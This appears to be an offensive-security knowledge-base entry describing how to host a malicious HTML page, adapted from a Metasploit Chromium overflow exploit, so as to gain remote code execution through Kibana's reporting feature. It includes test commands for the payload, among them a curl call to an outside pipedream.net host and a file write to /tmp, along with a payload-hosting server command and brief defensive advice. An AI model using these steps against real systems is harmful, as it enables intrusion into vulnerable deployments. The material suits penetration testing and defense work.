---
id: proc-host-html-rce
tags:
  - rce
  - payload-hosting
  - chromium
type: procedure
tools:
  - '[[tools/Python-SimpleHTTPServer]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/python-simplehttpserver-host]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:37.261Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host-Malicious-HTML-Payload-for-Chromium-RCE

## Summary

This procedure hosts a malicious HTML file adapted from the Metasploit chrome_simplifiedlowering_overflow exploit, which triggers RCE in vulnerable Chromium browsers like those in Kibana 7.11/7.12, allowing commands such as file writes to /tmp or outbound curl requests.

## Description

In the context of exploiting Kibana's reporting feature, the attacker creates an HTML payload that exploits a buffer overflow in Chrome's simplified lowering, executing arbitrary JavaScript to run system commands. The payload is hosted on a simple HTTP server accessible to the target Chromium instance. This step is crucial for testing direct RCE before chaining with open redirect. Prerequisites include a Linux environment for hosting and adaptation of the Metasploit exploit code.

## Requirements

1. Python 2/3 installed for SimpleHTTPServer.
2. Access to Metasploit or the exploit HTML source.
3. Network connectivity to serve on port 8009.
4. Local IP like 192.168.0.154 reachable from target.

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected HTTP servers on internal networks.
- Block outbound connections to unknown hosts from application servers.
- Use web application firewalls to scan for exploit signatures in HTML.

## Objectives

1. Deliver RCE-capable payload to vulnerable browser.
2. Test payload functionality with simple commands like uname or curl.
3. Prepare for integration into full attack chain.

## Instructions

### Step 1: Create Malicious HTML

**Context**: Adapt the Metasploit exploit to include RCE commands like 'uname -a > /tmp/alexb-says-hi' or 'curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud'.

Save as alexb-says-hi.html in current directory.

### Step 2: Host the Payload

**Context**: Start a simple HTTP server to serve the HTML file.

**Command** ([[commands/python-simplehttpserver-host]]):
```bash
python -m SimpleHTTPServer 8009
```

> This serves the current directory on port 8009. Access via http://192.168.0.154:8009/alexb-says-hi.html. Expected output: 'Serving HTTP on 0.0.0.0 port 8009 ...' and request logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/python-simplehttpserver-host]]
- [[commands/curl-payload-test]]
- [[commands/uname-payload-write]]

## Tools Used

- [[tools/Python-SimpleHTTPServer]]
- [[tools/Metasploit]]

## Tags

- rce
- payload-hosting
- chromium
